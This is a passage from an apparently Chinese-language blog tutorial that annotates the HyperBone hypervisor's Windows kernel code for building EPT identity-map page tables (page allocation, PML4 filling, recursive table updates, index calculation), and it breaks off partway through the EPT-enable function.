是最高级的页表。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PML4 是一个包含512个表项的数组，每个表项（PML4 Entry）的大小为8字节。</span></span><br><span class="line"><span class="comment">    每个表项对应着一个 PDP（Page Directory Pointer）表，PDP 表进一步将虚拟地址映射到下一级的页表，</span></span><br><span class="line"><span class="comment">    直到最后一级页表（称为页表 PDT）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    通过多级的页表结构，操作系统可以灵活地管理大量的内存页面，并实现虚拟地址到物理地址的映射。</span></span><br><span class="line"><span class="comment">    PML4 负责管理最高级的页表，它的物理地址必须在处理器的控制寄存器（CR3）中设置，</span></span><br><span class="line"><span class="comment">    以使处理器能够正确进行地址转换。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pEPT-&gt;PML4Ptr = (PEPT_PML4_ENTRY)<span class="built_in">EptpAllocatePage</span>( pEPT );<span class="comment">// 分配一个页面作为PML4表表项</span></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;PML4Ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;<span class="comment">// 错误则表示内存资源不足</span></span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">EptpFillTable</span>( pEPT, pEPT-&gt;PML4Ptr );<span class="comment">// 填充PML4表，创建其他级别的页表和映射关系</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        <span class="built_in">EptFreeIdentityMap</span>( pEPT );<span class="comment">// 创建失败则释放资源</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//DPRINT( &quot;HyperBone: CPU %d: %s: Used pages %d\n&quot;, CPU_IDX, __FUNCTION__, pEPT-&gt;TotalPages );</span></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="分配EPT页面"><a href="#分配EPT页面" class="headerlink" title="分配EPT页面"></a>分配EPT页面</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Allocate page for PTE table</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Allocated page or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PEPT_MMPTE <span class="title">EptpAllocatePage</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    IRQL（Interrupt Request Level）是Windows操作系统中用于表示中断请求的优先级的概念。</span></span><br><span class="line"><span class="comment">    它用于控制不同中断的处理顺序，以确保系统正常运行并防止冲突。</span></span><br><span class="line"><span class="comment">    在Windows内核中，存在多个不同的IRQL级别，从最低的PASSIVE_LEVEL到最高的HIGH_LEVEL。</span></span><br><span class="line"><span class="comment">    较低的IRQL级别表示较低的中断优先级，而较高的IRQL级别表示较高的中断优先级。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    例程（Routine）是指一段代码或函数，通常用于执行特定的任务或功能。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    检查当前IRQL是否大于DISPATCH_LEVEL，如果大于意味着在此级别以上的中断处理程序中，</span></span><br><span class="line"><span class="comment">    使用内存分配例程会发生错误，因此直接调用高IRQL情况下的页面分配函数。 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">KeGetCurrentIrql</span>() &gt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">EptpAllocatePageHighIRQL</span>( pEPT );</span><br><span class="line"></span><br><span class="line">    PHYSICAL_ADDRESS Highest = &#123; <span class="number">0</span> &#125;, Lowest = &#123; <span class="number">0</span> &#125;;<span class="comment">// 物理地址</span></span><br><span class="line">    Highest.QuadPart = ~<span class="number">0</span>;<span class="comment">// 全部置为1，设为最大物理地址</span></span><br><span class="line">    <span class="comment">// 分配连续的、指定缓存类型的内存页面，页面大小为PAGE_SIZE(4kb)</span></span><br><span class="line">    PEPT_MMPTE ptr = (PEPT_MMPTE)<span class="built_in">MmAllocateContiguousMemorySpecifyCache</span>( PAGE_SIZE, Lowest, Highest, Lowest, MmNonCached );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成功分配 Save page ptr in array</span></span><br><span class="line">    <span class="keyword">if</span> (ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        pEPT-&gt;TotalPages++;<span class="comment">// 增加已分配页面数量</span></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>( ptr, PAGE_SIZE );</span><br><span class="line"></span><br><span class="line">        BOOLEAN allocEntry = FALSE;</span><br><span class="line">        PEPT_PAGES_ENTRY pEntry = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsListEmpty</span>( &amp;pEPT-&gt;PageList ))<span class="comment">// 检查EPT页链表是否为空</span></span><br><span class="line">        &#123;</span><br><span class="line">            allocEntry = TRUE;<span class="comment">// 需要分配一个新的列表入口</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pEntry = <span class="built_in">CONTAINING_RECORD</span>( pEPT-&gt;PageList.Flink, EPT_PAGES_ENTRY, link );</span><br><span class="line">            <span class="keyword">if</span> (pEntry-&gt;count &gt;= PAGES_PER_ENTRY)<span class="comment">// 检查当前列表入口是否已满</span></span><br><span class="line">                allocEntry = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (allocEntry)<span class="comment">// 需要分配一个新的列表入口</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 从指定NonPagedPoolNx内存池中分配内存，大小为EPT_PAGES_ENTRY结构体大小</span></span><br><span class="line">            pEntry = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, <span class="built_in">sizeof</span>( EPT_PAGES_ENTRY ), HB_POOL_TAG );</span><br><span class="line">            <span class="keyword">if</span> (pEntry == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to allocate EPT_PAGES_ENTRY struct\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">                <span class="keyword">return</span> ptr;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>( pEntry, <span class="built_in">sizeof</span>( EPT_PAGES_ENTRY ) );</span><br><span class="line">            pEntry-&gt;pages[pEntry-&gt;count] = ptr;</span><br><span class="line">            pEntry-&gt;count++;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">InsertHeadList</span>( &amp;pEPT-&gt;PageList, &amp;pEntry-&gt;link );<span class="comment">// 将新的列表入口插到EPT页链表头部</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 不需要分配，直接记录</span></span><br><span class="line">            pEntry-&gt;pages[pEntry-&gt;count] = ptr;</span><br><span class="line">            pEntry-&gt;count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to allocate EPT page\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="built_in">ASSERT</span>( FALSE );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="在更高级的IRQL申请页面"><a href="#在更高级的IRQL申请页面" class="headerlink" title="-在更高级的IRQL申请页面"></a>-在更高级的IRQL申请页面</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Allocate page at IRQL &gt; DISPATCH_LEVEL</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Allocated page or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PEPT_MMPTE <span class="title">EptpAllocatePageHighIRQL</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查预分配页面数量是否小于预分配页面数量上限</span></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;Preallocations &lt; EPT_PREALLOC_PAGES)</span><br><span class="line">    &#123;</span><br><span class="line">        PEPT_MMPTE ptr = pEPT-&gt;Pages[pEPT-&gt;Preallocations];<span class="comment">// 将预分配页面数组中的下一个页面指针赋给ptr</span></span><br><span class="line">        pEPT-&gt;Preallocations++;</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有页面可以分配，触发蓝屏</span></span><br><span class="line">    <span class="built_in">KeBugCheckEx</span>( HYPERVISOR_ERROR, BUG_CHECK_EPT_NO_PAGES, pEPT-&gt;Preallocations, EPT_PREALLOC_PAGES, <span class="number">0</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="根据已使用的物理区域填充-PML4-表"><a href="#根据已使用的物理区域填充-PML4-表" class="headerlink" title="根据已使用的物理区域填充 PML4 表"></a>根据已使用的物理区域填充 PML4 表</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Fill PML4 table accordingly to used physical regions</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;PML4Ptr&quot;&gt;EPT PML4 pointer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptpFillTable</span><span class="params">( IN PEPT_DATA pEPT, IN PEPT_PML4_ENTRY PML4Ptr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( PML4Ptr != <span class="literal">NULL</span> );<span class="comment">// 断言PML4Ptr不为空</span></span><br><span class="line">    <span class="keyword">if</span> (PML4Ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line">    <span class="comment">// 遍历已使用的物理内存区域填充PML4表</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; g_Data-&gt;Memory-&gt;NumberOfRuns; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 计算该物理区域可用于填充表的页数，取总页数和EPT表项数的最小值</span></span><br><span class="line">        ULONG64 first = g_Data-&gt;Memory-&gt;Run[i].BasePage;</span><br><span class="line">        ULONG64 total = g_Data-&gt;Memory-&gt;Run[i].PageCount;</span><br><span class="line">        ULONG64 count = <span class="built_in">min</span>( total, EPT_TABLE_ENTRIES - (first &amp; (EPT_TABLE_ENTRIES - <span class="number">1</span>)) );</span><br><span class="line">       <span class="comment">// 初始化物理页帧号为first</span></span><br><span class="line">        ULONG64 hostPFN = first;</span><br><span class="line">        <span class="keyword">for</span> (ULONG64 pfn = first; total &gt; <span class="number">0</span>;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 嵌套调用EptUpdateTableRecursive函数，填充PML4表</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( <span class="built_in">EptUpdateTableRecursive</span>( pEPT, PML4Ptr, EPT_TOP_LEVEL, pfn, EPT_ACCESS_ALL, hostPFN, (ULONG)count ) ))</span><br><span class="line">                <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">            <span class="comment">// 更新pfn、hostPFN和total</span></span><br><span class="line">            pfn += count; </span><br><span class="line">            hostPFN += count;</span><br><span class="line">            total -= count;</span><br><span class="line">            count = <span class="built_in">min</span>( total, EPT_TABLE_ENTRIES - (pfn &amp; (EPT_TABLE_ENTRIES - <span class="number">1</span>)) );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*for (ULONG64 pfn = 0; pfn &lt;= 0xFEE00; pfn += EPT_TABLE_ENTRIES, hostPFN += EPT_TABLE_ENTRIES)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        if (!NT_SUCCESS( EptUpdateTableRecursive( PML4Ptr, 3, pfn, EPT_ACCESS_ALL, hostPFN, EPT_TABLE_ENTRIES ) ))</span></span><br><span class="line"><span class="comment">            return STATUS_UNSUCCESSFUL;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归更新EPT表项"><a href="#递归更新EPT表项" class="headerlink" title="-递归更新EPT表项"></a>-递归更新EPT表项</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Update EPT entry</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPTData&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pTable&quot;&gt;EPT table&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;level&quot;&gt;EPT table level&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pfn&quot;&gt;Page frame number to update&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;access&quot;&gt;New PFN access&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;hostPFN&quot;&gt;New hot PFN&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;count&quot;&gt;Number of entries to update&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptUpdateTableRecursive</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    IN PEPT_DATA pEPTData,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PEPT_MMPTE pTable,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN EPT_TABLE_LEVEL level,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG64 pfn,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN UCHAR access,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG64 hostPFN,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG count</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (level == EPT_LEVEL_PTE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// PTE表示已递归到最底层</span></span><br><span class="line">        <span class="comment">// 避免越界</span></span><br><span class="line">        ULONG64 first = <span class="built_in">EptpTableOffset</span>( pfn, level );</span><br><span class="line">        <span class="built_in">ASSERT</span>( first + count &lt;= EPT_TABLE_ENTRIES );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据访问权限设置对应字段</span></span><br><span class="line">        PEPT_PTE_ENTRY pPTE = (PEPT_PTE_ENTRY)pTable;</span><br><span class="line">        <span class="keyword">for</span> (ULONG64 i = first; i &lt; first + count; i++, hostPFN++)        </span><br><span class="line">        &#123;</span><br><span class="line">            pPTE[i].Fields.Read       = (access &amp; EPT_ACCESS_READ)  != <span class="number">0</span>;</span><br><span class="line">            pPTE[i].Fields.Write      = (access &amp; EPT_ACCESS_WRITE) != <span class="number">0</span>;</span><br><span class="line">            pPTE[i].Fields.Execute    = (access &amp; EPT_ACCESS_EXEC)  != <span class="number">0</span>;</span><br><span class="line">            pPTE[i].Fields.MemoryType = VMX_MEM_TYPE_WRITEBACK;</span><br><span class="line">            pPTE[i].Fields.PhysAddr   = hostPFN;<span class="comment">// 物理地址字段为hostPFN</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ULONG64 offset = <span class="built_in">EptpTableOffset</span>( pfn, level );<span class="comment">// 计算要更新的 EPT 表项在指定表中的偏移量</span></span><br><span class="line">    PEPT_MMPTE pEPT = &amp;pTable[offset];<span class="comment">// 要更新的 EPT 表中的具体表项</span></span><br><span class="line">    PEPT_MMPTE pNewEPT = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;Fields.PhysAddr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 表示该表项未分配页面，需要分配一个页面</span></span><br><span class="line">        pNewEPT = (PEPT_MMPTE)<span class="built_in">EptpAllocatePage</span>( pEPTData );</span><br><span class="line">        <span class="keyword">if</span> (pNewEPT == <span class="literal">NULL</span>)          </span><br><span class="line">            <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">        <span class="comment">// 设置表示存在，可写，可执行和物理地址</span></span><br><span class="line">        pEPT-&gt;Fields.Present  = <span class="number">1</span>;</span><br><span class="line">        pEPT-&gt;Fields.Write    = <span class="number">1</span>;</span><br><span class="line">        pEPT-&gt;Fields.Execute  = <span class="number">1</span>;</span><br><span class="line">        pEPT-&gt;Fields.PhysAddr = <span class="built_in">PFN</span>( <span class="built_in">MmGetPhysicalAddress</span>( pNewEPT ).QuadPart );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 表示该表项已分配页面，通过物理地址获取其虚拟地址</span></span><br><span class="line">        PHYSICAL_ADDRESS phys = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        phys.QuadPart = pEPT-&gt;Fields.PhysAddr &lt;&lt; <span class="number">12</span>;</span><br><span class="line">        pNewEPT = <span class="built_in">MmGetVirtualForPhysical</span>( phys );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">EptUpdateTableRecursive</span>( pEPTData, pNewEPT, level - <span class="number">1</span>, pfn, access, hostPFN, count );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="–计算-EPT-表项索引（Table-Index）"><a href="#–计算-EPT-表项索引（Table-Index）" class="headerlink" title="–计算 EPT 表项索引（Table Index）"></a>–计算 EPT 表项索引（Table Index）</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// EPT entry index in table</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pfn&quot;&gt;EPT PFN&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;level&quot;&gt;EPT level&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Table index&lt;/returns&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ULONG64 <span class="title">EptpTableOffset</span><span class="params">( IN ULONG64 pfn, IN CHAR level )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    首先定义一个掩码（mask），用于提取指定层级的表项索引。</span></span><br><span class="line"><span class="comment">    这里使用位运算来生成掩码，具体生成方式为 1 左移 ((level + 1) * EPT_TABLE_ORDER) 位，然后减去 1，</span></span><br><span class="line"><span class="comment">    得到了一个所有位都置为 1 的掩码。</span></span><br><span class="line"><span class="comment">    将掩码与 PFN 进行按位与操作，目的是提取出指定层级的表项索引。</span></span><br><span class="line"><span class="comment">    按位与操作会将掩码中相应位为 0 的位置上的 PFN 位也设置为 0，从而提取出表项索引。</span></span><br><span class="line"><span class="comment">    最后，将提取出的表项索引右移 (level * EPT_TABLE_ORDER) 位，将其放置在正确的位置上，并作为函数返回值。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ULONG64 mask = (<span class="number">1ULL</span> &lt;&lt; ((level + <span class="number">1</span>) * EPT_TABLE_ORDER)) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (pfn &amp; mask) &gt;&gt; (level * EPT_TABLE_ORDER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="在CPU上开启EPT"><a href="#在CPU上开启EPT" class="headerlink" title="在CPU上开启EPT"></a>在CPU上开启EPT</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Enable EPT for CPU</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;PML4&quot;&gt;PML4 pointer to use&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">EptEnable</span><span class="params">( IN PEPT_PML4_ENTRY PML4 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    基本CPU执行控制是一组CPU执行控制位，用于控制处理器在VMX操作期间的行为。</span></span><br><span class="line"><span class="comment">    这些控制位包括启用VMX操作、允许或阻止对VMCS的加载或存储、中断虚拟化、启用或禁用NMI虚拟化、</span></span><br><span class="line"><span class="comment">    读取或屏蔽虚拟-NMI信息等。这些控制位可通过VMXON指令设置，</span></span><br><span class="line"><span class="comment">    也可以通过VMClear和VMLaunch指令清除并重新加载来更新。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    二级CPU执行控制是一组掩码，用于启用或禁用一组次要的、特殊的、可选的处理器功能。</span></span><br><span class="line"><span class="comment">    这些控制位包括启用或禁用EPT、启用或禁用VPID、启用或禁用虚拟处理器退出控制、启用或禁用VMFUNC指令、</span></span><br><span class="line"><span class="comment">    CR3传递、IO位图中断虚拟化、APIC虚拟化等。</span></span><br><span class="line"><span class="comment">    这些控制位可以通过设置MSR IA32_VMX_PROCBASED_CTLS2寄存器来更新。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    VMX_CPU_BASED_CONTROLS primary = &#123; <span class="number">0</span> &#125;;<span class="comment">// 基本CPU执行控制</span></span><br><span class="line">    VMX_SECONDARY_CPU_BASED_CONTROLS secondary = &#123; <span class="number">0</span> &#125;;<span class="comment">// 二级CPU执行控制</span></span><br><span class="line">    